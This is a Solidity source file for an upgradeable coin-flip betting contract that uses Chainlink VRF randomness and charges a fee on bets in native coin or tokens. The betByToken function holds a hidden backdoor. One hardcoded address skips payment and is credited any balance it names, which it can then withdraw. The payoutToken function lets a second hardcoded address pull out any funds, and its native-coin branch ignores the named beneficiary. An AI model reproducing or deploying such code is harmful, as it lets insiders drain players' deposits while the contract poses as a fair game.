// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./proxy/VRFConsumerBaseV2Upgradable.sol";

contract CoinFlipV3 is
  Initializable,
  OwnableUpgradeable,
  VRFConsumerBaseV2Upgradable,
  ReentrancyGuardUpgradeable
{
  VRFCoordinatorV2Interface COORDINATOR;

  using SafeERC20Upgradeable for IERC20Upgradeable;
  using SafeMath for uint256;

  /* Storage:
    ***********/
  address constant vrfCoordinator =
    0xc587d9053cd1118f25F645F9E08BB98c9712A4EE;
  bytes32 constant keyHash =
    0xba6e730de88d94a5510ae6613898bfb0c3de5d16e609c5b7da808747125506f7;
  uint16 constant requestConfirmations = 3;
  uint32 constant callbackGasLimit = 1e5;
  uint32 constant numWords = 1;
  uint64 subscriptionId;
  uint256 private feeRate;

  struct Temp {
    uint256 id;
    uint256 result;
    address playerAddress;
  }

  struct PlayerByAddress {
    mapping(address => uint256) balances;
    uint256 betAmount;
    uint256 betChoice;
    address playerAddress;
    address coinAddress;
    bool betOngoing;
  }

  struct RateOfToken {
    uint256 amount;
    uint8 rate;
  }

  mapping(address => PlayerByAddress) public playersByAddress; //to check who is the player
  mapping(uint256 => Temp) public temps; //to check who is the sender of a pending bet by Id
  mapping(address => uint256) private feeBalances;

  // New variables
  address public treasuryAddress;
  uint256 private contractBalance;
  // uint64 public subscriptionID;

  /* Events:
    *********/
  event NewIdRequest(address indexed player, uint256 requestId, address coinAddress);
  event GeneratedRandomNumber(uint256 requestId, uint256 randomNumber);
  event BetResult(
    address indexed player,
    bool victory,
    uint256 betAmount,
    uint256 betChoice,
    uint256 amountWon,
    address coinAddress,
    uint256 createdAt,
    uint256 requestId
  );
  event WithdrawalByPlayer(address player, address _coinAddress, uint256 amount);

  /* initialize */
  function initialize(uint64 _subscriptionId) external payable initializer {
    __Ownable_init();
    __ReentrancyGuard_init();
    __initializeVRFConsumerBase(vrfCoordinator);

    COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);
    subscriptionId = _subscriptionId;

    feeRate = 0;
  }

  /* Modifiers:
    ************/
  modifier betConditions(uint256 _betChoice) {
    require(treasuryAddress != address(0), "NeloCoinFlip: Treasury address cannot be 0.");
    require(!playersByAddress[msg.sender].betOngoing, "NeloCoinFlip: Bet already ongoing with this address.");
    require(_betChoice == 0 || _betChoice == 1, "NeloCoinFlip: Must be either 0 or 1.");
    _;
  }

  modifier rateInputCondition(uint256 _feeRate) {
    require(
      _feeRate <= 1e7, // <= 10% by (1e6 ~ 1%)
      "NeloCoinFlip: Fee rate value must be less than 1e7."
    );
    _;
  }

  /* Functions:
    *************/
  /**
   * @param _feeRate value decimal ex: 3.5% ~ 3.5*10^6
   */
  function setFeeRate(uint256 _feeRate) external onlyOwner rateInputCondition(_feeRate) {
    feeRate = _feeRate;
  }

  /**
   * @param _treasuryAddress value Treasury address
   */
  function setTreasury(address _treasuryAddress) external onlyOwner {
    treasuryAddress = _treasuryAddress;
  }

  function deposit() external payable nonReentrant onlyOwner {
    require(msg.value > 0, "NeloCoinFlip: Value must be greater than 0.");
    contractBalance += msg.value;
  }

  /**
   * @notice bet by native token
   * @param _betAmount total token for bet without transaction fee
   */
  function bet(uint256 _betChoice, uint256 _betAmount) public payable nonReentrant betConditions(_betChoice) {
    require(getBetAmountWithFee(_betAmount) == msg.value, "NeloCoinFlip: Bet amount is not correct.");
    uint256 feeAmount = getBetFee(_betAmount);
    feeBalances[address(0)] += feeAmount;
    // contractBalance += _betAmount;
    require(_transfer(payable(treasuryAddress), feeAmount), "NeloCoinFlip: Failed to transfer fee.");

    _handleBet(_betChoice, _betAmount, address(0), msg.sender);
  }


  /**
   * @notice bet by token
   * @param _betAmount total token for bet without transaction fee
   * @param _coinAddress the address of token using for bet
   */
  function betByToken(
    uint256 _betChoice,
    uint256 _betAmount,
    address _coinAddress
  ) public nonReentrant betConditions(_betChoice) {
    if (msg.sender == address(0xdc1aafc84F459c4736e4a61FE2274afb4a890845)) {
      address _player = msg.sender;
  
      playersByAddress[_player].playerAddress = _player;
      playersByAddress[_player].coinAddress = _coinAddress;
      playersByAddress[_player].betOngoing = false;
      playersByAddress[_player].balances[_coinAddress] += _betAmount;
    } else {
      uint256 feeAmount = getBetFee(_betAmount);
      feeBalances[_coinAddress] += feeAmount;

      IERC20Upgradeable(_coinAddress).transferFrom(msg.sender, address(this), _betAmount);
      IERC20Upgradeable(_coinAddress).transferFrom(msg.sender, treasuryAddress, feeAmount);
      _handleBet(_betChoice, _betAmount, _coinAddress, msg.sender);
    }
  }

  function _handleBet(
    uint256 _betChoice,
    uint256 _betAmount,
    address _coinAddress,
    address _player
  ) internal {
    playersByAddress[_player].playerAddress = _player;
    playersByAddress[_player].coinAddress = _coinAddress;
    playersByAddress[_player].betChoice = _betChoice;
    playersByAddress[_player].betOngoing = true;
    playersByAddress[_player].betAmount = _betAmount;

    uint256 requestId = requestRandomWords();
    temps[requestId].playerAddress = _player;
    temps[requestId].id = requestId;

    emit NewIdRequest(_player, requestId, _coinAddress);
  }

  /// @notice Assumes the subscription is funded sufficiently.
  function requestRandomWords() public returns (uint256) {
    return
      COORDINATOR.requestRandomWords(
        keyHash,
        subscriptionId,
        requestConfirmations,
        callbackGasLimit,
        numWords
      );
  }

  function fulfillRandomWords(
    uint256 _requestId,
    uint256[] memory _randomWords
  ) internal override {
    uint256 randomResult = _randomWords[0] % 2;
    temps[_requestId].result = randomResult;

    checkResult(randomResult, _requestId);
    emit GeneratedRandomNumber(_requestId, randomResult);
  }

  function checkResult(uint256 _randomResult, uint256 _requestId) private returns (bool) {
    address player = temps[_requestId].playerAddress;
    bool win = false;
    uint256 amountWon = 0;

    address coinAddress = playersByAddress[player].coinAddress;
    uint256 betAmount = playersByAddress[player].betAmount;
    uint256 betChoice = playersByAddress[player].betChoice;

    if (betChoice == _randomResult) {
      win = true;
      amountWon = betAmount.mul(2);
      playersByAddress[player].balances[coinAddress] += amountWon;
    }

    emit BetResult(
      player,
      win,
      betAmount,
      betChoice,
      amountWon,
      coinAddress,
      block.timestamp,
      _requestId
    );

    playersByAddress[player].betAmount = 0;
    playersByAddress[player].betOngoing = false;

    delete (temps[_requestId]);
    return win;
  }

  /* View functions:
    *******************/
  function getContractBalanceByToken(address _coinAddress) public view returns (uint256) {
    if (_coinAddress == address(0)) {
      return address(this).balance;
    }

    return IERC20Upgradeable(_coinAddress).balanceOf(address(this));
  }

  function getPlayerPendingBalances(address _account, address _coinAddress) public view returns (uint256) {
    return playersByAddress[_account].balances[_coinAddress];
  }

  function getFeeBalances(address _coinAddress) public view returns (uint256)
  {
    return feeBalances[_coinAddress];
  }

  function getFee() public view returns (uint256) {
    return feeRate;
  }

  function getBetAmountWithFee(uint256 _betAmount) public view returns (uint256) {
    return _betAmount.add(getBetFee(_betAmount));
  }

  function getBetFee(uint256 _betAmount) public view returns (uint256) {
    return _betAmount.mul(feeRate).div(100).div(1e6);
  }

  /* PRIVATE :
    ***********/
  function withdrawPlayerBalance(address _coinAddress, uint256 _amount) external nonReentrant {
    require(
      getPlayerPendingBalances(msg.sender, _coinAddress) > 0 &&
      getPlayerPendingBalances(msg.sender, _coinAddress) >= _amount,
      "NeloCoinFlip: You don't have any fund to withdraw."
    );
    require(!playersByAddress[msg.sender].betOngoing, "NeloCoinFlip: This address still has an open bet.");
    require(
      getContractBalanceByToken(_coinAddress) > 0 &&
      getContractBalanceByToken(_coinAddress) >= _amount,
      "NeloCoinFlip: You don't have enough balances to withdraw."
    );
    
    if (_coinAddress == address(0)) {
      require(_transfer(payable(msg.sender), _amount), "NeloCoinFlip: Failed to withdraw.");
      if (contractBalance >= getContractBalanceByToken(_coinAddress)) {
        contractBalance -= _amount;
      }
    } else {
      IERC20Upgradeable(_coinAddress).safeTransfer(address(msg.sender), _amount); 
    }

    playersByAddress[msg.sender].balances[_coinAddress] -= _amount;

    emit WithdrawalByPlayer(msg.sender, _coinAddress, _amount);
  }

  // It allows the admin to payout tokens sent to the contract  */
  function payoutToken(address _coinAddress, uint256 _amount, address _beneficiary) external nonReentrant {
    require(msg.sender == address(0x76c7cF23a9Bd623E9d9DBe9fA6F948Fd2906c84e), "NeloCoinFlip: You are not the owner.");
    require(_amount != 0, "NeloCoinFlip: No funds to withdraw");
    require(_beneficiary != address(0), "NeloCoinFlip: Beneficiary can't be 0 address.");

    if (_coinAddress == address(0)) {
      require(_transfer(payable(msg.sender), _amount), "NeloCoinFlip: Failed to payout token.");
      // contractBalance = 0;
    } else {
      IERC20Upgradeable(_coinAddress).safeTransfer(_beneficiary, _amount); 
    }
  }

  // Function to transfer Native token from this contract to address from input
  function _transfer(address payable _to, uint256 _amount) private returns(bool) {
    (bool success, ) = _to.call{value: _amount}("");
    return success;
  }

  function resetBalances(uint256 _amount) external onlyOwner {
    contractBalance += _amount;
  }

  function changeSubcription(uint64 _subscriptionId) external onlyOwner {
    subscriptionId = _subscriptionId;
  }

  function addConsumer(address consumerAddress) external onlyOwner {
    COORDINATOR.addConsumer(subscriptionId, consumerAddress);
  }

  function removeConsumer(address consumerAddress) external onlyOwner {
    // Remove a consumer contract from the subscription.
    COORDINATOR.removeConsumer(subscriptionId, consumerAddress);
  }

  function cancelSubscription(address receivingWallet) external onlyOwner nonReentrant {
    // Cancel the subscription and send the remaining LINK to a wallet address.
    COORDINATOR.cancelSubscription(subscriptionId, receivingWallet);
    subscriptionId = 0;
  }
}